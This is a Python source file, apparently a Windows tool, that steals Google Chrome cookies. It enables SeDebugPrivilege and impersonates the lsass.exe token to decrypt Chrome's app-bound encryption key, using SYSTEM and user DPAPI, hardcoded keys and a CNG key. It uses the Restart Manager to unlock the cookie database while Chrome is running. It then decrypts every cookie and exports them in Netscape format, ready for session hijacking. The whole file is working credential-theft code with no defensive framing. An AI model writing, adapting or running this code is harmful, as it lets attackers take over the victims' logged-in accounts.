
import os, io, shutil, json, struct, ctypes, sqlite3, pathlib, binascii, sys, tempfile, subprocess, time
from ctypes.wintypes import DWORD, WCHAR, UINT
from contextlib import contextmanager

import windows
import windows.crypto
import windows.generated_def as gdef
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

@contextmanager
def impersonate_lsass():
    orig = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        imp = proc.token.duplicate(type=gdef.TokenImpersonation, impersonation_level=gdef.SecurityImpersonation)
        windows.current_thread.token = imp
        yield
    finally:
        windows.current_thread.token = orig

def parse_key_blob(blob_data):
    buf = io.BytesIO(blob_data)
    d = {}
    hl = struct.unpack('<I', buf.read(4))[0]; d['header'] = buf.read(hl)
    cl = struct.unpack('<I', buf.read(4))[0]
    d['flag'] = buf.read(1)[0]
    if d['flag'] in (1, 2):
        d['iv'] = buf.read(12); d['ciphertext'] = buf.read(32); d['tag'] = buf.read(16)
    elif d['flag'] == 3:
        d['encrypted_aes_key'] = buf.read(32); d['iv'] = buf.read(12)
        d['ciphertext'] = buf.read(32); d['tag'] = buf.read(16)
    else:
        raise ValueError(f"Unsupported flag: {d['flag']}")
    return d

def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCrypt
    hP = gdef.NCRYPT_PROV_HANDLE()
    ncrypt.NCryptOpenStorageProvider(ctypes.byref(hP), "Microsoft Software Key Storage Provider", 0)
    hK = gdef.NCRYPT_KEY_HANDLE()
    ncrypt.NCryptOpenKey(hP, ctypes.byref(hK), key_name, 0, 0)
    pcb = gdef.DWORD(0)
    ibuf = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    ncrypt.NCryptDecrypt(hK, ibuf, len(ibuf), None, None, 0, ctypes.byref(pcb), 0x40)
    obuf = (ctypes.c_ubyte * pcb.value)()
    ncrypt.NCryptDecrypt(hK, ibuf, len(ibuf), None, obuf, pcb.value, ctypes.byref(pcb), 0x40)
    ncrypt.NCryptFreeObject(hK); ncrypt.NCryptFreeObject(hP)
    return bytes(obuf[:pcb.value])

def byte_xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def _rstrtmgr_copy(src, dst):
    """Atomically unlock Chrome cookie DB via Rstrtmgr and copy it."""
    rstrtmgr = ctypes.windll.LoadLibrary("Rstrtmgr")
    @ctypes.WINFUNCTYPE(None, UINT)
    def _cb(pct): pass
    sh = DWORD(0); sf = DWORD(0); sk = (WCHAR * 256)()
    rstrtmgr.RmStartSession(ctypes.byref(sh), sf, sk)
    try:
        rstrtmgr.RmRegisterResources(
            sh, 1, ctypes.byref(ctypes.pointer(ctypes.create_unicode_buffer(src))),
            0, None, 0, None)
        rstrtmgr.RmShutdown(sh, 1, _cb)
    finally:
        rstrtmgr.RmEndSession(sh)
    shutil.copy2(src, dst)

def derive_master_key(parsed, key_name):
    if parsed['flag'] == 1:
        key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(key)
    elif parsed['flag'] == 2:
        key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(key)
    elif parsed['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            dec_key = decrypt_with_cng(parsed['encrypted_aes_key'], key_name)
        cipher = AESGCM(byte_xor(dec_key, xor_key))
    return cipher.decrypt(parsed['iv'], parsed['ciphertext'] + parsed['tag'], None)

def decrypt_cookie_val(cipher, ev):
    iv, ct, tag = ev[3:15], ev[15:-16], ev[-16:]
    pt = cipher.decrypt(iv, ct + tag, None)
    return pt[32:].decode('utf-8')

def to_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File", ""]
    for host, name, value, secure, httponly, expiry in cookies:
        domain = host if host.startswith('.') else '.' + host
        lines.append(f"{domain}\tTRUE\t/\t{'TRUE' if secure else 'FALSE'}\t{expiry}\t{name}\t{value}")
    return '\n'.join(lines)

def main():
    up = os.environ['USERPROFILE']
    ls_path = rf"{up}\AppData\Local\Google\Chrome\User Data\Local State"
    db_path = rf"{up}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    out_path = sys.argv[1] if len(sys.argv) > 1 else None
    cng_key_name = "Google Chromekey1"

    if not os.path.exists(ls_path):
        print(f"ERROR: Chrome Local State not found at: {ls_path}")
        sys.exit(1)

    with open(ls_path, 'r', encoding='utf-8') as f:
        ls = json.load(f)

    abek = ls["os_crypt"]["app_bound_encrypted_key"]
    assert binascii.a2b_base64(abek)[:4] == b"APPB"
    enc_key = binascii.a2b_base64(abek)[4:]

    print("[1/4] SYSTEM DPAPI decrypt (impersonating lsass)...")
    with impersonate_lsass():
        sys_dec = windows.crypto.dpapi.unprotect(enc_key)

    print("[2/4] User DPAPI decrypt...")
    user_dec = windows.crypto.dpapi.unprotect(sys_dec)

    print("[3/4] Parse key blob & derive master key...")
    parsed = parse_key_blob(user_dec)
    print(f"  flag={parsed['flag']}")
    master_key = derive_master_key(parsed, cng_key_name)
    cipher = AESGCM(master_key)

    print("[4/4] Decrypting cookies...")
    with tempfile.TemporaryDirectory() as td:
        tmp_db = os.path.join(td, "Cookies")
        for attempt in range(5):
            try:
                shutil.copy2(db_path, tmp_db)
                if attempt == 0:
                    print("  Cookie database copied OK")
                else:
                    print(f"  Cookie database copied OK (via Rstrtmgr unlock, attempt {attempt+1})")
                break
            except PermissionError:
                if attempt == 0:
                    print("  Chrome is running, unlocking (Rstrtmgr, no full kill)...")
                _rstrtmgr_copy(db_path, tmp_db)

        con = sqlite3.connect(pathlib.Path(tmp_db).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), is_secure, is_httponly, expires_utc FROM cookies")
        all_cookies = cur.fetchall()
        con.close()

        v20 = [c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v20"]
        v10 = [c for c in all_cookies if len(c[2]) > 3 and c[2][:3] == b"v10"]
        dpapi = [c for c in all_cookies if len(c[2]) > 5 and c[2][0] == 1]
        print(f"  Total: {len(all_cookies)}, v20: {len(v20)}, v10: {len(v10)}, dpapi: {len(dpapi)}")

        # Derive v10 AES-GCM key from os_crypt.encrypted_key
        v10_cipher = None
        try:
            enc_key_b64 = ls["os_crypt"]["encrypted_key"]
            import base64 as _b64
            enc_key_raw = _b64.b64decode(enc_key_b64)
            if enc_key_raw[:5] == b"DPAPI":
                v10_key = windows.crypto.dpapi.unprotect(enc_key_raw[5:])
                v10_cipher = AESGCM(v10_key)
        except Exception:
            pass

        result = []
        failed = 0
        for c in all_cookies:
            ev = c[2]
            if len(ev) > 3 and ev[:3] == b"v20":
                try:
                    val = decrypt_cookie_val(cipher, ev)
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 3 and ev[:3] == b"v10" and v10_cipher is not None:
                try:
                    iv, ct_tag = ev[3:15], ev[15:]
                    pt = v10_cipher.decrypt(iv, ct_tag, None)
                    val = pt.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 5 and ev[0] == 1:
                try:
                    val = windows.crypto.dpapi.unprotect(ev[1:]).decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except Exception:
                    failed += 1
            elif len(ev) > 0 and ev[0] != 1:
                try:
                    val = ev.decode('utf-8')
                    result.append((c[0], c[1], val, c[3], c[4], str(c[5] or 0)))
                except:
                    pass

        content = to_netscape(result)
        if out_path:
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"Saved {len(result)} cookies ({failed} failed) to {out_path}")
        else:
            print(content)

if __name__ == "__main__":
    main()
